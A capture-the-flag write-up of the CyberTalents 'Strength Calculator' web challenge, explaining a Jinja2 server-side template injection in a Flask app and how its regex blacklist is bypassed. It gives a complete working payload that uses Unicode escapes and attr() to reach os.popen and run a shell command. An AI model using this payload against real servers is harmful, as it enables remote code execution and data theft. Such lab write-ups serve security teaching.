# CyberTalents: Strength Calculator WEB CTF

## Introduction

In this write-up, we’ll explore the **Strength Calculator** challenge from CyberTalents, a hard-difficulty web challenge.

At first glance, the application seems simple: it calculates the **“strength” of a user’s name** based on ASCII values. But underneath, it hides a **Server-Side Template Injection (SSTI)** vulnerability protected by a **strict blacklist**.

![Challenge Setup](https://private-us-east-1.manuscdn.com/sessionFile/szZWsijiitHc2ADCHoT0S5/sandbox/FzzibvaDXy0ayP7z0T2IZ1-images_1772388540593_na1fn_L2hvbWUvdWJ1bnR1L2N5YmVydGFsZW50c19jdGYvaW1hZ2VzL2NoYWxsZW5nZV9zZXR1cA.webp?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvc3paV3NpamlpdEhjMkFEQ0hvVDBTNS9zYW5kYm94L0Z6emlidmFEWHkwYXlQN3owVDJJWjEtaW1hZ2VzXzE3NzIzODg1NDA1OTNfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyTjVZbVZ5ZEdGc1pXNTBjMTlqZEdZdmFXMWhaMlZ6TDJOb1lXeHNaVzVuWlY5elpYUjFjQS53ZWJwIiwiQ29uZGl0aW9uIjp7IkRhdGVMZXNzVGhhbiI6eyJBV1M6RXBvY2hUaW1lIjoxNzk4NzYxNjAwfX19XX0_&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=QZB2uI5x1-rSG3BSUWNyoK4DaZPca0ZzybPk87mbO1J3FLZwxmYla6KGuNmeIO9XaEGSrahTiErzSBx-LhAMT4R~dCOo3~-~nTSrMaxBiJADKozbUw1Zk9OC8fMZJt9Oa3Q5Znc1CGzv31dDRHFeSS2ctBkGbbu0o6vllThnONyGTQzVhNcwdaDDpRvDJm4ixTVCr7UwDVigNYdDcdFhdCDL6udUuhNV~cjIZ18vmDIU37GFwyXUakWx2vWJ9MojaXyhy9s7S3P4FFTkV-FsUxu1jPXInTLY-Qo57ouc6F80gh3UGi-VK3jt~L-NkyqCpu1yF2U0203LwwmQktiJmw__)

## Challenge Setup

Challenge URL:

`http://cdcamxwl32pue3e6mwl32pnnte3e6p6v40ye1cxzg-web.cybertalentslabs.com/`

## Observations

The page is minimal:

*   **Input field:** “Name”
*   **Calculate button**
*   **Output:** displays user as “Guest” and a numerical “Strength”

![Observations](https://private-us-east-1.manuscdn.com/sessionFile/szZWsijiitHc2ADCHoT0S5/sandbox/FzzibvaDXy0ayP7z0T2IZ1-images_1772388540593_na1fn_L2hvbWUvdWJ1bnR1L2N5YmVydGFsZW50c19jdGYvaW1hZ2VzL29ic2VydmF0aW9ucw.webp?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvc3paV3NpamlpdEhjMkFEQ0hvVDBTNS9zYW5kYm94L0Z6emlidmFEWHkwYXlQN3owVDJJWjEtaW1hZ2VzXzE3NzIzODg1NDA1OTNfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyTjVZbVZ5ZEdGc1pXNTBjMTlqZEdZdmFXMWhaMlZ6TDI5aWMyVnlkbUYwYVc5dWN3LndlYnAiLCJDb25kaXRpb24iOnsiRGF0ZUxlc3NUaGFuIjp7IkFXUzpFcG9jaFRpbWUiOjE3OTg3NjE2MDB9fX1dfQ__&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=oqTq5icnpQh9m02ClEfGFv-wDT~P2zMcSy44TdEfKENgMNDpooijBs3gibr9DQaQC4RKLvQ2qVRbIvWIDIJBbfm4LhmaqFUjoHT7W0f0RgcRBcFLwBygDqFdr4sUgmKSE-ez5bK2C1uQQUv5vyOGrMnW22O021Q2PW0yXhCpD~nGLmbCBNCZyYJMfd1abfrPQn~Fh3aOJ0FLGtLM-fZEqel0Q5EsiahjhYViL68dS0a~yfxk1MUI-o7z9-frg2dmKSgjW46bncmydADjPo06YvMxNQSB0dMA01VFZLNsD8OAFuaNkyqxLn9kbeod4mo5JUhpDkoBgQw9hAHGNSzucg__)

Inspecting the page source reveals an interesting comment:

Accessing `/source` allowed us to download the **backend code** (`main.py`), which gave critical insight into the vulnerability and the filtering mechanism.

## Source Code Analysis

Here is the core logic of the application:

```python
name = "Name : "+render_template_string(request.form["name"])
```

![Source Code Analysis](https://private-us-east-1.manuscdn.com/sessionFile/szZWsijiitHc2ADCHoT0S5/sandbox/FzzibvaDXy0ayP7z0T2IZ1-images_1772388540593_na1fn_L2hvbWUvdWJ1bnR1L2N5YmVydGFsZW50c19jdGYvaW1hZ2VzL3NvdXJjZV9jb2RlX2FuYWx5c2lz.webp?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvc3paV3NpamlpdEhjMkFEQ0hvVDBTNS9zYW5kYm94L0Z6emlidmFEWHkwYXlQN3owVDJJWjEtaW1hZ2VzXzE3NzIzODg1NDA1OTNfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyTjVZbVZ5ZEdGc1pXNTBjMTlqZEdZdmFXMWhaMlZ6TDNOdmRYSmpaVjlqYjJSbFgyRnVZV3g1YzJsei53ZWJwIiwiQ29uZGl0aW9uIjp7IkRhdGVMZXNzVGhhbiI6eyJBV1M6RXBvY2hUaW1lIjoxNzk4NzYxNjAwfX19XX0_&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=WBjAOjETcB~nN3xypOC8IGCTBLJSiSO0XnrdeE3B0pKTLYJqJIrle2cE8KWyaKR3728iXay0HcSqUkUD6XH5vizDSNsMrjIFU1YrH4POQx8wKU~b~99jfhrwpQcrNB7P4GTKodZhc-GZLQGo0manFaEt2t~NtHqV28M6l~HLlS4mXwBjmtVYSuEZeH4DQ1ASUM4Z7ZPnB~HvCM9cKxScWHcv1DK4fqnsNVqSLxcf93pnay-YmtnUMWB2p8oBypALv4UpjA449rFkba4oj3GJcwCVRAeXoCzBF9utbWnOj9g7qeUWdM4un099v7sKChnGIuNSPKFjNSDK-uGqHGWSew__)

## Key Takeaways

1.  **Server-Side Template Injection (SSTI)**

    *   The user input is passed directly to `render_template_string()`.
    *   Any Jinja2 template expressions in the input will be evaluated on the server.
    *   This opens the door for arbitrary Python execution.

2.  **Blacklist Filtering**

    *   Input is filtered with the regex:

    `re.search("\\{\\{|\\}\\}|(popen)|(os)|(subprocess)|(application)|(getitem)|(flag.txt)|\\.|\_|\\\[|\\\]|\\"|(class)|(subclasses)|(mro)", request.form["name"])
`

    *   Blocks Jinja2 delimiters (`{{ }}`)
    *   Blocks OS command functions (`os`, `popen`, `subprocess`)
    *   Blocks object introspection (`class`, `subclasses`, `mro`)
    *   Blocks file access (`flag.txt`)
    *   Blocks special characters (`.`, `_`, `[`, `]`, `"`)

3.  **Admin Check**

    ```python
    def isAdmin():  
        return False
    ```

    No administrative access through this route; SSTI is required for execution.

4.  **Strength Calculation**

    ```python
    def calculateStrength(name):  
        strength = 0  
        for _ in name:  
            strength += ord(_)  
        return str(strength)
    ```

    *   This calculates ASCII sum of input characters.
    *   Not directly relevant for exploitation but part of the output interface.

## Understanding the Attack Surface

## Why SSTI Works

Even with the blacklist, Jinja2 **internals** are still accessible:

*   Template objects have attributes like `__init__`, `__globals__`, `__builtins__`
*   Builtins include `__import__`, allowing module import
*   Modules like `os` can be used to execute commands

Bypassing the blacklist allows traversal of these objects to execute arbitrary Python code.

## Bypass Strategy

The challenge’s main hurdle is the **strict blacklist**. Here’s how it was overcome.

![Bypass Strategy](https://private-us-east-1.manuscdn.com/sessionFile/szZWsijiitHc2ADCHoT0S5/sandbox/FzzibvaDXy0ayP7z0T2IZ1-images_1772388540593_na1fn_L2hvbWUvdWJ1bnR1L2N5YmVydGFsZW50c19jdGYvaW1hZ2VzL2J5cGFzc19zdHJhdGVneQ.webp?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvc3paV3NpamlpdEhjMkFEQ0hvVDBTNS9zYW5kYm94L0Z6emlidmFEWHkwYXlQN3owVDJJWjEtaW1hZ2VzXzE3NzIzODg1NDA1OTNfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyTjVZbVZ5ZEdGc1pXNTBjMTlqZEdZdmFXMWhaMlZ6TDJKNWNHRnpjMTl6ZEhKaGRHVm5lUS53ZWJwIiwiQ29uZGl0aW9uIjp7IkRhdGVMZXNzVGhhbiI6eyJBV1M6RXBvY2hUaW1lIjoxNzk4NzYxNjAwfX19XX0_&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=fVEID1TZyqphFKKFf3DJLgvzEDu8xyEY8Jt2-evlocLOoy090xMwOPlEgm3Jw~Rbuobs4i2vKQSygMuovogdzJJ~P3vYZfti6DmfFqvUw0c5N072w61drfzErT6tRQD1pMb6AkHMWVtbs-hXcOnAUyvpolxb~WMa4-S386p9r~gck-PZBLOurpV8xTH2IFjv83SmjSK6yR7bQ4fDUgnMv7uqa6~0ldbP9KATv6GGfszOoumhkxAjmjUBJPAHzazWJU1APXdKsfyrcI7~6d8cyuGCc12rnQpb0iAnU2~F2SzQHsI3cgamMnoHF-dpE1WyKTkzWN4aGwbG7KZjtNEk0Q__)

### 1. Use `{% %}` Instead of `{{ }}`

*   `{{ }}` is blocked, but `{% %}` is allowed.
*   `{% %}` supports:
    *   `set` (create variables)
    *   `print` (output values)
    *   Control structures like `if`, `for`
*   This allows us to evaluate expressions indirectly.

### 2. Use Unicode Escapes

*   Blacklisted terms like `os`, `popen`, `__globals__`, `flag.txt` can be **encoded** using Unicode escapes.
*   Example:

    `popen → p\u006fp\u0065n`
    `__ → \u005f\u005f`
    `. → \u002e`

*   This bypasses regex detection while reconstructing strings during template execution.

### 3. Use `attr()` Instead of Dot Notation

*   The dot `.` is blocked.
*   Jinja2 supports `attr()` to access attributes by name:

    `object|attr("attribute_name")`

*   Combine this with Unicode escapes to access Python internals like `__globals__` and `__builtins__`.

## Step-by-Step Exploit

![Step-by-Step Exploit](https://private-us-east-1.manuscdn.com/sessionFile/szZWsijiitHc2ADCHoT0S5/sandbox/FzzibvaDXy0ayP7z0T2IZ1-images_1772388540593_na1fn_L2hvbWUvdWJ1bnR1L2N5YmVydGFsZW50c19jdGYvaW1hZ2VzL3N0ZXBfYnlfc3RlcF9leHBsb2l0.webp?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvc3paV3NpamlpdEhjMkFEQ0hvVDBTNS9zYW5kYm94L0Z6emlidmFEWHkwYXlQN3owVDJJWjEtaW1hZ2VzXzE3NzIzODg1NDA1OTNfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyTjVZbVZ5ZEdGc1pXNTBjMTlqZEdZdmFXMWhaMlZ6TDNOMFpYQmZZbmxmYzNSbGNGOWxlSEJzYjJsMC53ZWJwIiwiQ29uZGl0aW9uIjp7IkRhdGVMZXNzVGhhbiI6eyJBV1M6RXBvY2hUaW1lIjoxNzk4NzYxNjAwfX19XX0_&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=POrJIotel4UIu~Kd48KNMPgkovX072HaU1kYNe2pXHjJ22FQC1W2VI9gQd~pItvhB9BWlbed7i2r0QveGdfbiKCzV1ErR3gJ5U4MqlQuYkxnFM0MXcx7CUJQjG2TIVhjNVzYXmY6RSmuybs6Xb047ZLBsVTO8ZbyBczkeCiPQ4i7JSJWBbVJvsi4eHplVNCPqzQVJmUkxOsN2Ut76uQTcNCTOQZZla7xgVOs3VQzt7AlF8fZCXepRztWD5vSVtNEZMTkskcuX4gTI3z4dKwTmVO9mkU~7fcBoB03IKjC7zMVxHq9i5o40YJROU1NUh6YSkZ-v4JpJ5AmNljb0V98SQ__)

### Step 1: Access Built-ins

```jinja2
{% set context = self  
|attr(\'\\u005f\\u005finit\\u005f\\u005f\')  
|attr(\'\\u005f\\u005fglobals\\u005f\\u005f\')  
|attr(\'get\')(\'\\u005f\\u005fbuiltins\\u005f\\u005f\') %}
```

*   `self`: template object
*   `__init__`: constructor
*   `__globals__`: module globals
*   `__builtins__`: Python built-ins

### Step 2: Import `os` Module

```jinja2
{% set python0s = context  
|attr(\'get\')(\'\\u005f\\u005fimport\\u005f\\u005f\')  
(\'o\'+\'s\') %}
```

*   `__import__` imported via `builtins`
*   `'o'+'s'` avoids triggering the `os` filter

### Step 3: Execute Command

```jinja2
{% set command = python0s  
|attr(\'p\\u006fp\\u0065n\')  
(\'cat /flag\\u002etxt > static/f\\u006cag\\u002etxt\') %}
```

*   `popen()` is accessed via Unicode escape
*   Executes shell command to write the flag to `/static/flag.txt`
*   `flag.txt` partially encoded to bypass blacklist

### Step 4: Read Output

```jinja2
{% set result = command|attr(\'read\')() %}
```

*   Reads output of the command

### Step 5: Print Result

```jinja2
{% print result %}
```

*   Outputs the flag to the page

## Complete Payload

```jinja2
{% set context = self|attr(\'\\u005f\\u005finit\\u005f\\u005f\')|attr(\'\\u005f\\u005fglobals\\u005f\\u005f\')|attr(\'get\')(\'\\u005f\\u005fbuiltins\\u005f\\u005f\') %}{% set python0s = context|attr(\'get\')(\'\\u005f\\u005fimport\\u005f\\u005f\')(\'o\'+\'s\') %}{% set command = python0s|attr(\'p\\u006fp\\u0065n\')(\'cat /flag\\u002etxt > static/f\\u006cag\\u002etxt\') %}{% set result = command|attr(\'read\')() %}{% print result %}
```

![Complete Payload](https://private-us-east-1.manuscdn.com/sessionFile/szZWsijiitHc2ADCHoT0S5/sandbox/FzzibvaDXy0ayP7z0T2IZ1-images_1772388540593_na1fn_L2hvbWUvdWJ1bnR1L2N5YmVydGFsZW50c19jdGYvaW1hZ2VzL2NvbXBsZXRlX3BheWxvYWQ.webp?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvc3paV3NpamlpdEhjMkFEQ0hvVDBTNS9zYW5kYm94L0Z6emlidmFEWHkwYXlQN3owVDJJWjEtaW1hZ2VzXzE3NzIzODg1NDA1OTNfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyTjVZbVZ5ZEdGc1pXNTBjMTlqZEdZdmFXMWhaMlZ6TDJOdmJYQnNaWFJsWDNCaGVXeHZZV1Eud2VicCIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTc5ODc2MTYwMH19fV19&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=VvBDP0okxD1bllo-RLydNjGOVDEZ-Ol6GoNqOuEVWAKnjLfpZTRgZjT9jAPKPs1W8g5s0HBrvsyamc8kMXHtp5ezUqBj1JVYzHEvkWINBTgHmrrnv9y-lDV0lWGv8ss2-XeGLG7g9E9uDEV1p-GVv0pxdkWsPlC~q-kwfdnvUwLcfux5jjZWmaeLhtlfGH5XzAdXHuqbDnswhMX7WF7wJNdrM2OqqsfzGl-rP2MaSku2yFag5POfi3t3abea8w36JbiJIgz20J3in8u0k7XrSuPLlNrbsueZR1-KNJeq10Az7N6daILwR~JD8OpTyI7IiK4sI2too7D9tBz4mvDuVQ__)

**Then access Location:**

`http://cdcamxwl32pue3e6mwl32pnnte3e6p6v40ye1cxzg-web.cybertalentslabs.com/static/flag.txt`

## Written by MS.Jix

Reasoning > Guessing
